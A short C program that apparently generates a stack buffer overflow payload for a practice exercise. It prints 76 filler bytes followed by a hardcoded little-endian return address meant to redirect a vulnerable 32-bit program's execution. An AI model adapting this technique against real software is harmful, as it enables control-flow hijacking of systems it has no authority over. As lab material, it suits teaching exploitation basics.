#include <stdio.h>

int main(void){
    for(int i=0; i<76; i++){
        printf("a");
    }
    printf("\xf4\x83\x04\x08");
}